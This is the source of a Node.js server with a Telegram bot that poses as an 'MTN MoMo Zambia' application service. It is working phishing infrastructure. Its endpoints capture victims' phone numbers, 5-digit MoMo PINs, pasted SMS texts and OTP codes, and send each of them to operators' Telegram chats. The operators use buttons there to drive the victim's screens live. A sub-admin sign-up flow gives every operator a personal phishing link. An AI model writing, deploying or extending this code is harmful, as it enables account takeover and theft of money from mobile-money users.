/**
 * **MTN MOMO ZAMBIA - SECURE MULTI-ADMIN SERVER**
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8845346118';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

if (!APP_URL) {
  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
  process.exit(1);
}

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const parsed = JSON.parse(data);
      const entries = Array.isArray(parsed) ? parsed : [];
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: true,
        paid: true,
        username: rec?.username || '',
        firstName: rec?.firstName || 'User',
        lastName: rec?.lastName || '',
        status: rec?.status || 'ACTIVE'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();
const adminConfigMessageIds = new Map();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
      return FALLBACK_ADMIN_ID;
    }
    return targetAdmin;
  }
  return FALLBACK_ADMIN_ID || null;
}

async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
  const PAGE_SIZE = 5;
  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(FALLBACK_ADMIN_ID));
  const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
  
  if (page < 0) page = 0;
  if (page >= totalPages) page = totalPages - 1;

  const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);

  let adminListText = `👑 *Sub-Admin Control Panel* (Page ${page + 1} of ${totalPages})\n\nAll sub-admins currently have free access:`;
  let keyboard = [];

  if (adminEntries.length === 0) {
    adminListText += `\n\nNo sub-admins have started the bot yet.`;
  } else {
    paginatedEntries.forEach(([id, record]) => {
      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'User');
      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Status: 🟢 Free Access Active`;
    });
  }

  let navRow = [];
  if (page > 0) navRow.push({ text: `⬅️ Prev`, callback_data: `PAGE_${page - 1}` });
  navRow.push({ text: `🔄 Refresh`, callback_data: `PAGE_${page}` });
  if (page < totalPages - 1) navRow.push({ text: `Next ➡️`, callback_data: `PAGE_${page + 1}` });
  if (navRow.length > 0) keyboard.push(navRow);

  if (messageId) {
    try {
      await bot.editMessageText(adminListText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
      return;
    } catch (err) {}
  }

  const sentMsg = await bot.sendMessage(chatId, adminListText, { 
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: keyboard } 
  });
  adminConfigMessageIds.set(chatId, sentMsg.message_id);
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: false });
  
  const webhookPath = `/bot${TOKEN}`;
  const webhookUrl = `${APP_URL}${webhookPath}`;

  try {
    await bot.setWebHook(webhookUrl);
    app.post(webhookPath, (req, res) => {
      res.sendStatus(200);
      try { bot.processUpdate(req.body); } catch (err) {}
    });
  } catch (err) {
    process.exit(1);
  }

  bot.onText(/\/admins/, async (msg) => {
    const chatId = String(msg.chat.id);
    if (chatId !== String(FALLBACK_ADMIN_ID)) {
      await bot.sendMessage(chatId, `⚠️ Unauthorized.`);
      return;
    }
    await updateContinuousAdminList(chatId, null, 0);
  });

  bot.onText(/\/myprofile|\/me/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username ? `@${msg.from.username}` : 'None';
      const firstName = msg.from.first_name || 'N/A';
      const lastName = msg.from.last_name || 'N/A';
      
      const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;

      let profileText = 
        `👤 *Your Personal Details & Account Info*\n\n` +
        `• *First Name:* ${firstName}\n` +
        `• *Last Name:* ${lastName}\n` +
        `• *Username:* ${username}\n` +
        `• *Telegram ID:* \`${userId}\`\n` +
        `• *Link Status:* 🟢 Free & Active\n\n` +
        `🔗 *Your Exclusive Link:*\n${userLink}`;

      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username || '';
      const firstName = msg.from.first_name || 'User';
      const lastName = msg.from.last_name || '';

      if (chatId === String(FALLBACK_ADMIN_ID)) {
        await bot.sendMessage(chatId, `👑 Welcome Main Admin. Your link is free and active: ${APP_URL}\n\nType /admins to view sub-admins.`, {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '📋 View Sub-Admins', callback_data: 'PAGE_0' }],
              [{ text: '👤 View My Profile', callback_data: 'SHOW_MY_PROFILE' }]
            ]
          }
        });
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, {
          authorized: true,
          paid: true,
          username,
          firstName,
          lastName,
          startedAt: new Date()
        });
        saveAdmins();
      } else {
        const existing = admins.get(chatId);
        existing.username = username;
        existing.firstName = firstName;
        existing.lastName = lastName;
        saveAdmins();
      }

      await bot.sendMessage(FALLBACK_ADMIN_ID, 
        `🚨 *New Sub-Admin Started Bot!*\n\n` +
        `👤 *User:* ${username ? '@' + username : firstName} (${firstName} ${lastName})\n` +
        `🆔 *Chat ID:* \`${userId}\`\n\n` +
        `Status: Free link access granted automatically.`, 
        { parse_mode: 'Markdown' }
      );

      const userLink = `${APP_URL}/?admin=${chatId}`;
      let responseText = `👋 *Welcome ${firstName}!*\n\nYour account is active. Here is your free link:\n${userLink}`;

      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });

    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const user = query.from;

      if (actionData === 'SHOW_MY_PROFILE') {
        const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
        let profileText = 
          `👤 *Your Personal Details & Account Info*\n\n` +
          `• *First Name:* ${user.first_name || 'N/A'}\n` +
          `• *Last Name:* ${user.last_name || 'N/A'}\n` +
          `• *Username:* ${user.username ? '@' + user.username : 'None'}\n` +
          `• *Telegram ID:* \`${user.id}\`\n` +
          `• *Link Status:* 🟢 Free & Active\n\n` +
          `🔗 *Your Exclusive Link:*\n${userLink}`;

        await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(query.id);
        return;
      }

      if (actionData.startsWith('PAGE_')) {
        const pageNum = parseInt(actionData.split('_')[1]) || 0;
        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
        await bot.answerCallbackQuery(query.id);
        return;
      }

      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) {
        session = { contact: 'Unknown', adminChatId: chatId };
      }

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'ALLOW_PIN':
        case 'ALLOW_OTP':
          session.status = 'SMS_PASTE_STEP';
          await bot.sendMessage(chatTarget, `✅ PIN approved. SMS paste screen loaded for +260${session.contact}`);
          break;
        case 'DENY_OTP':
          session.status = 'DENIED';
          await bot.sendMessage(chatTarget, `❌ Access Denied for +260${session.contact}`);
          break;
        case 'CORRECT_OTP':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Success screen triggered for +260${session.contact}`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong PIN error for +260${session.contact}`);
          break;
        case 'WRONG_OTP':
          session.status = 'RETRY_OTP';
          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong OTP error for +260${session.contact}`);
          break;
        case 'PASTED_APPROVE':
          session.status = 'OTP_STEP';
          await bot.sendMessage(chatTarget, `✅ Valid SMS accepted. OTP screen loaded for +260${session.contact}`);
          break;
        case 'PASTED_REJECT':
          session.status = 'SMS_REJECTED';
          await bot.sendMessage(chatTarget, `❌ SMS verification rejected for +260${session.contact}`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` }).catch(() => {});

      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        ).catch(() => {});
      }
    } catch (err) {
      try {
        await bot.answerCallbackQuery(query.id, { text: '⚠️ Error processing action.' }).catch(() => {});
      } catch (e) {}
    }
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/submit-application', async (req, res) => {
  try {
    let { contact, pin, amount, adminChatId } = req.body || {};

    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const cleanContact = String(contact || '').replace(/\D/g, '');
    
    const mtnZambiaRegex = /^0(96|76)\d{7}$/;
    if (!mtnZambiaRegex.test(cleanContact)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid number. Applicants must use a valid MTN Zambia MoMo number only (e.g., 096... or 076...).' 
      });
    }

    const cleanPin = String(pin || '').trim();
    if (!/^\d{5}$/.test(cleanPin)) {
      return res.status(400).json({ 
        success: false, 
        error: 'MTN MoMo PIN must be exactly 5 digits.' 
      });
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'Destination chat ID missing.' });
    }

    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;

    sessions.set(userId, {
      contact: cleanContact,
      pin: cleanPin,
      amount: amount || 'ZMW 5,000',
      adminChatId: targetChat,
      status: 'WAITING_PIN_APPROVAL',
      createdAt: new Date()
    });

    const message =
      `🚨 *MTN MOMO ZAMBIA - PIN ATTEMPT*\n\n` +
      `📱 *MTN Phone:* +260${cleanContact}\n` +
      `🔑 *5-Digit PIN:* \`${cleanPin}\`\n` +
      `💰 *Selected Amount:* ${amount}\n\n` +
      `📌 *Status:* Waiting for Admin Approval`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ ALLOW PIN', callback_data: `ALLOW_PIN_${userId}` },
            { text: '❌ DENY', callback_data: `DENY_OTP_${userId}` }
          ]
        ]
      }
    };

    if (!bot) {
      return res.status(500).json({ success: false, error: 'Bot instance not initialized' });
    }

    const sentMsg = await bot.sendMessage(targetChat, message, opts);
    const session = sessions.get(userId);
    if (session) session.adminMsgId = sentMsg.message_id;
    
    return res.status(200).json({ success: true, userId });

  } catch (err) {
    return res.status(500).json({ success: false, error: 'Telegram delivery failed: ' + (err?.message || 'Unknown error') });
  }
});

app.post('/verify-sms-pasted', async (req, res) => {
  try {
    const { userId, pastedSms } = req.body || {};
    const session = sessions.get(userId);

    if (!session) {
      return res.status(404).json({ success: false, error: 'Session not found' });
    }

    session.pasted_sms = pastedSms;
    session.status = 'PENDING_PASTED_SMS';

    const escapedSms = String(pastedSms || 'N/A').replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');

    const message =
      `💬 *MTN ZAMBIA - SMS SUBMITTED*\n\n` +
      `📱 *MTN Phone:* +260${session.contact}\n\n` +
      `📄 *Content:* Copy below text:\n` +
      `\`${escapedSms}\`\n\n` +
      `🆔 *User ID:* ${userId}`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ VALID SMS (LOAD OTP)', callback_data: `PASTED_APPROVE_${userId}` },
            { text: '❌ REJECT SMS', callback_data: `PASTED_REJECT_${userId}` }
          ]
        ]
      }
    };

    const targetChat = session.adminChatId;
    if (targetChat && bot) {
      await bot.sendMessage(targetChat, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Telegram delivery failed' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message =
      `📩 *OTP SUBMITTED BY USER*\n\n` +
      `📱 *MTN Phone:* +260${session.contact}\n` +
      `🔢 *OTP Entered:* \`${otp}\`\n\n` +
      `Select confirmation action:`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
          ],
          [
            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    const targetChat = session.adminChatId;
    if (targetChat && bot) {
      await bot.sendMessage(targetChat, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Telegram delivery failed' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
});
    
